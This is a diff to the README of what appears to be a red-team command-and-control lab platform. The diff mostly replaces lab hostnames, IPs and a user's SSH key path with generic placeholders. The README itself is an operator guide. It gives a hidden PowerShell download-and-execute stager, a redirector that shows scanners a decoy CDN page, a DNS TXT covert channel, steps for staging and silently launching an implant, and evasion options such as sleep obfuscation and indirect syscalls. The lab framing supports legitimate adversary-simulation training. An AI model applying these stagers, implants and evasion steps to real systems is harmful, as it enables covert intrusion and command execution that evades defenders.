@@ -103,7 +103,7 @@ Styled in C2Stack's signature **Warm Obsidian-Amber** palette (mirroring the log
 │                                                                                                  │
 │  [1. LIVE OPSEC REDIRECTOR WATERFALL (Interactive Packet Inspection)]                            │
 │                                                                                                  │
-│      [ Victim IP: 192.168.77.62 ]                                                                │
+│      [ Victim IP: 192.168.100.62 ]                                                                │
 │                   │                                                                              │
 │                   ▼                                                                              │
 │         [ Apache Port 80 ] ──▶ Evaluates Header: `X-Request-ID`                                  │
@@ -116,19 +116,19 @@ Styled in C2Stack's signature **Warm Obsidian-Amber** palette (mirroring the log
 │       • URI: `/sliver/session`  ➔ Sliver :80             • Blue Team / Scanners see NO C2!       │
 │                                                                                                  │
 │  [2. MERIDIAN DNS TXT COVERT TUNNEL DISSECTOR (Educational Telemetry)]                           │
-│  [15353/UDP] IN:  `01.A3F99B.c2.cadre.local`  ➔ Length: 36 bytes (Base32 Chunk 1/2)             │
-│  [15353/UDP] IN:  `02.A3F99B.c2.cadre.local`  ➔ Length: 28 bytes (Base32 Chunk 2/2)             │
+│  [15353/UDP] IN:  `01.A3F99B.c2.lab.local`  ➔ Length: 36 bytes (Base32 Chunk 1/2)             │
+│  [15353/UDP] IN:  `02.A3F99B.c2.lab.local`  ➔ Length: 28 bytes (Base32 Chunk 2/2)             │
 │  [DECRYPTED]: X25519 DH + AES-GCM Envelope ➔ Payload: `whoami /groups`                           │
 │                                                                                                  │
 │  [3. CROSS-FRAMEWORK PAYLOAD STUDIO]                                                             │
 │  Framework: [ Sliver ▼ ]   Target: [ Windows x64 ▼ ]   Transport: [ HTTP via Redirector ▼ ]      │
 │  One-Liner Stager:                                                                               │
-│  powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.77.1/s')" │
+│  powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.100.1/s')" │
 │  [ 📋 Copy Command ]    [ 💾 Download Compiled Implant ]    [ 🧪 Simulate Beacon Callback ]      │
 │                                                                                                  │
 │  [4. UNIFIED FLEET RADAR]                                                                        │
 │  Session ID   C2 Engine   Target Host   User         Transport      Last Beacon   Status         │
-│  c2-901a      Sliver      WS01          analyst_t1   HTTP (Proxy)   2s ago        🟢 Active      │
+│  c2-901a      Sliver      win-target          analyst   HTTP (Proxy)   2s ago        🟢 Active      │
 │  c2-44f2      Meridian    DC01          SYSTEM       DNS TXT        14s ago       🟢 Active      │
 └──────────────────────────────────────────────────────────────────────────────────────────────────┘
 ```
@@ -275,7 +275,7 @@ Verify that all service status cards display **● RUNNING** in green.
    export MERIDIAN_HTTP="http://<C2STACK_IP>:80"
    export MERIDIAN_URI_PREFIX="/gateway/v1/telemetry"
    export MERIDIAN_DNS="<C2STACK_IP>:15353"
-   export MERIDIAN_DNS_DOMAIN="c2.cadre.local"
+   export MERIDIAN_DNS_DOMAIN="c2.lab.local"
    ./parallax-linux-amd64
    ```
    > ⚠️ **Do NOT put the route path in both vars.** The implant requests
@@ -363,7 +363,7 @@ Verify that all service status cards display **● RUNNING** in green.
    - Select `x64 EXE` or `x64 DLL`.
    - Enable **Indirect Syscalls** and **Sleep Obfuscation (Ekko / Zilean)**.
 4. **Execute & Validate**:
-   Execute the Demon on Windows member servers (`mbr01` or `ws01`). Verify via Process Hacker / Process Explorer that executable memory regions remain masked during sleep cycles.
+   Execute the Demon on Windows member servers (`win-target` or another member server). Verify via Process Hacker / Process Explorer that executable memory regions remain masked during sleep cycles.
 5. **Drive the Demon headlessly** (no GUI needed — the full vocabulary is in
    `Docker/portal/havoc_client.py`, shapes extracted from the client's
    `ConsoleInput.cc`/`CommandSend.cc` and the teamserver's `demons.go`):
@@ -373,7 +373,7 @@ Verify that all service status cards display **● RUNNING** in green.
      -H 'Content-Type: application/json' \
      -d '{"backend":"havoc","session_id":"<id>","command":"ls C:\\"}'
    ```
-   Verified 2026-10-04 on ws01: `shell`, `powershell`, `ls/dir/pwd/cat/cp/mv/
+   Verified 2026-10-04 on win-target: `shell`, `powershell`, `ls/dir/pwd/cat/cp/mv/
    mkdir/rm`, `ps`, `sleep`, `checkin`, `token list/getuid`, `config
    implant.verbose`, `net domain`, `job list`, `task list` (14/14).
    Traps: `CommandID` must be NUMERIC (a string is silently coerced to 0 and
@@ -414,7 +414,7 @@ tasking, results — with no Qt client, using the official REST API.
 5. **Read results without WebSocket**: `GET /endpoint/agent/task/list`
    returns completed tasks with `a_text` output.
 
-Verified 2026-10-04 on ws01 (11/11): `getuid`, `ls`, `pwd`, `ps list`,
+Verified 2026-10-04 on win-target (11/11): `getuid`, `ls`, `pwd`, `ps list`,
 `shell`, `powershell`, `cat`, `disks`, `sleep`, `jobs list`, `cd`. The
 portal's Operations Console speaks this API natively (`/api/ops/adaptix/*`,
 full catalogue at `/api/ops/catalogues`).
@@ -491,20 +491,20 @@ When C2Stack is used against the CADRE range, it generates realistic blue-team t
 
 ## 8. End-to-End CADRE Lab Walkthrough (Beginner's First C2 Engagement)
 
-If you have never operated a Command and Control (C2) framework before, this section walks you through your very first live adversary simulation against the **CADRE lab environment** (`192.168.77.0/24`).
+If you have never operated a Command and Control (C2) framework before, this section walks you through your very first live adversary simulation against your **lab environment** (`192.168.100.0/24`).
 
 ---
 
 ### A. The "Never Used a C2" Mental Model
 
 #### 1. Why Can't We Just Use SSH or RDP?
-In ordinary system administration, you connect **inbound** to the server (`ssh admin@192.168.77.62`).
+In ordinary system administration, you connect **inbound** to the server (`ssh admin@192.168.100.62`).
 In a corporate enterprise, **inbound connections from the outside world are strictly blocked** by border firewalls, NAT, and Windows Defender Firewall. 
 
 #### 2. The Reverse Callback (Beaconing) Paradigm
 Modern C2 flips the connection direction:
 ```
-[ Attacker / Redirector ] ◀────── Outbound Port 80 / UDP 15353 ─────── [ Victim Host (ws01) ]
+[ Attacker / Redirector ] ◀────── Outbound Port 80 / UDP 15353 ─────── [ Victim Host (win-target) ]
 ```
 The victim host calls **outbound** to your C2 redirector over allowed egress protocols (HTTP web traffic or DNS lookups). Corporate firewalls permit internal workstations to browse the web and resolve domain names, so the implant rides silently on these allowed protocols.
 
@@ -522,16 +522,16 @@ The victim host calls **outbound** to your C2 redirector over allowed egress pro
 ```
 ┌────────────────────────────────────────────────────────┐
 │ WINDOWS HOST MACHINE (C2Stack Host)                   │
-│ • Docker Edge Redirector:  192.168.77.1:80 (HTTP)      │
-│ • Docker Meridian Listener: 192.168.77.1:15353 (UDP)   │
+│ • Docker Edge Redirector:  192.168.100.1:80 (HTTP)      │
+│ • Docker Meridian Listener: 192.168.100.1:15353 (UDP)   │
 │ • Flight Control Web UI:    http://localhost:8000      │
 └───────────────────────────┬────────────────────────────┘
-                            │ VMware vmnet2 Network (192.168.77.0/24)
+                            │ Lab network (192.168.100.0/24)
 ┌───────────────────────────┴────────────────────────────┐
 │ CADRE ACTIVE DIRECTORY LAB                             │
-│ • Target Beachhead Workstation: ws01 (192.168.77.62)   │
+│ • Target Beachhead Workstation: win-target (192.168.100.62)   │
 │ • Operating System:             Windows 11 Enterprise  │
-│ • Target User:                  CHILD\analyst_t1       │
+│ • Target User:                  LAB\analyst       │
 └────────────────────────────────────────────────────────┘
 ```
 
@@ -546,54 +546,54 @@ The victim host calls **outbound** to your C2 redirector over allowed egress pro
 
 ---
 
-#### Stage 2: Test Network Ingress & Decoy Protection from `ws01`
+#### Stage 2: Test Network Ingress & Decoy Protection from `win-target`
 Before dropping any executable, verify how the target machine perceives your C2 redirector:
 
-1. Open a PowerShell terminal on your host and connect to `ws01`:
+1. Open a PowerShell terminal on your host and connect to `win-target`:
    ```powershell
-   ssh -i C:\Users\Ganro\.ssh\cadre-ws01-key analyst_t1@192.168.77.62
+   ssh -i C:\Users\operator\.ssh\target-key analyst@192.168.100.62
    ```
 2. **Test 1 — Unauthenticated Scanner Probe (No Header)**:
    ```cmd
-   curl.exe -i http://192.168.77.1/
+   curl.exe -i http://192.168.100.1/
    ```
    - *Observation*: Notice the server returns `HTTP/1.1 200 OK` serving the **CloudEdge CDN Global Edge Cache** decoy page! If an analyst investigates the IP, they see only a harmless CDN.
 3. **Test 2 — Authenticated Implant Probe (With C2 Header)**:
    ```cmd
-   curl.exe -i -H "X-Request-ID: cadre-c2" http://192.168.77.1/gateway/v1/telemetry/
+   curl.exe -i -H "X-Request-ID: cadre-c2" http://192.168.100.1/gateway/v1/telemetry/
    ```
    - *Observation*: Notice the response originates from the internal Meridian backend (`404` or `405 Method Not Allowed` on raw GET, confirming the proxy reached the hidden core).
 
 ---
 
-#### Stage 3: Stage the Meridian Implant on `ws01`
+#### Stage 3: Stage the Meridian Implant on `win-target`
 The Meridian container automatically builds static binaries on container startup inside `/opt/meridian/payloads/`.
 
 1. In a PowerShell window on your host, copy the precompiled Windows binary from the container to your host:
    ```powershell
    docker cp docker-meridian-1:/opt/meridian/payloads/parallax-windows-amd64.exe .
    ```
-2. Transfer the executable to `ws01` via SCP:
+2. Transfer the executable to `win-target` via SCP:
    ```powershell
-   scp -i C:\Users\Ganro\.ssh\cadre-ws01-key .\parallax-windows-amd64.exe analyst_t1@192.168.77.62:C:\Users\analyst_t1\Downloads\
+   scp -i C:\Users\operator\.ssh\target-key .\parallax-windows-amd64.exe analyst@192.168.100.62:C:\Users\analyst\Downloads\
    ```
 
 ---
 
 #### Stage 4: Launch the Implant with Dual Transports (HTTP + DNS Failover)
-On the `ws01` SSH session, launch the implant with both primary HTTP fronting and secondary DNS covert channel configured:
+On the `win-target` SSH session, launch the implant with both primary HTTP fronting and secondary DNS covert channel configured:
 
 ```cmd
-cd C:\Users\analyst_t1\Downloads
+cd C:\Users\analyst\Downloads
 
 :: Configure HTTP Primary Transport (through the Apache Redirector).
 :: Base URL and route prefix are SEPARATE vars — see the warning below.
-set MERIDIAN_HTTP=http://192.168.77.1:80
+set MERIDIAN_HTTP=http://192.168.100.1:80
 set MERIDIAN_URI_PREFIX=/gateway/v1/telemetry
 
 :: Configure DNS Secondary Covert Transport
-set MERIDIAN_DNS=192.168.77.1:15353
-set MERIDIAN_DNS_DOMAIN=c2.cadre.local
+set MERIDIAN_DNS=192.168.100.1:15353
+set MERIDIAN_DNS_DOMAIN=c2.lab.local
 
 :: Execute the implant in background
 start /b parallax-windows-amd64.exe
@@ -604,7 +604,7 @@ start /b parallax-windows-amd64.exe
 #### Stage 5: Observe the Live Beacon in Flight Control & CLI
 1. Look at your browser on **`http://localhost:8000`** $\rightarrow$ **Fleet Radar**:
    - Within 5 seconds, a new session appears!
-   - Shows **Session ID**, Engine **Meridian**, Host **WS01**, User **analyst_t1**, and Transport **HTTP (Proxy)** with live heartbeat pulses.
+   - Shows **Session ID**, Engine **Meridian**, Host **win-target**, User **analyst**, and Transport **HTTP (Proxy)** with live heartbeat pulses.
 2. Open a separate terminal on your host to interact with the Meridian console:
    ```powershell
    docker exec -it docker-meridian-1 python3 -m meridian.cli
@@ -613,7 +613,7 @@ start /b parallax-windows-amd64.exe
    ```text
    sessions
    ```
-   You will see your active connection to `WS01`.
+   You will see your active connection to `win-target`.
 4. Interact with the session:
    ```text
    use <session_id>
@@ -632,7 +632,7 @@ Remember: C2 commands do not run synchronously. You queue a task, the beacon che
    ```text
    results
    ```
-   You will see the complete user token, SID, and domain groups for `CHILD\analyst_t1`!
+   You will see the complete user token, SID, and domain groups for `LAB\analyst`!
 3. Queue network reconnaissance:
    ```text
    exec ipconfig /all
@@ -644,7 +644,7 @@ Remember: C2 commands do not run synchronously. You queue a task, the beacon che
 #### Stage 7: The "Holy Grail" Test — Simulating Egress Block & Automatic DNS Escape
 This is the ultimate test of covert C2 resilience: what happens when the SOC detects and kills outbound HTTP traffic?
 
-1. On the `ws01` SSH terminal (as administrator or member), block outbound TCP port 80:
+1. On the `win-target` SSH terminal (as administrator or member), block outbound TCP port 80:
    ```cmd
    netsh advfirewall firewall add rule name="Block-C2-HTTP" dir=out action=block protocol=TCP remoteport=80
    ```
@@ -667,7 +667,7 @@ This is the ultimate test of covert C2 resilience: what happens when the SOC det
 ---
 
 #### Stage 8: Clean Tear-Down
-1. In the `ws01` terminal, remove the test firewall block:
+1. In the `win-target` terminal, remove the test firewall block:
    ```cmd
    netsh advfirewall firewall delete rule name="Block-C2-HTTP"
    ```
@@ -677,7 +677,7 @@ This is the ultimate test of covert C2 resilience: what happens when the SOC det
    ```
 3. Clean up the test binary:
    ```cmd
-   del C:\Users\analyst_t1\Downloads\parallax-windows-amd64.exe
+   del C:\Users\analyst\Downloads\parallax-windows-amd64.exe
    ```
 
 Congratulations! You have completed a full, real-world C2 lifecycle: fronted ingress validation, implant staging, asynchronous execution, and automated covert DNS failover!
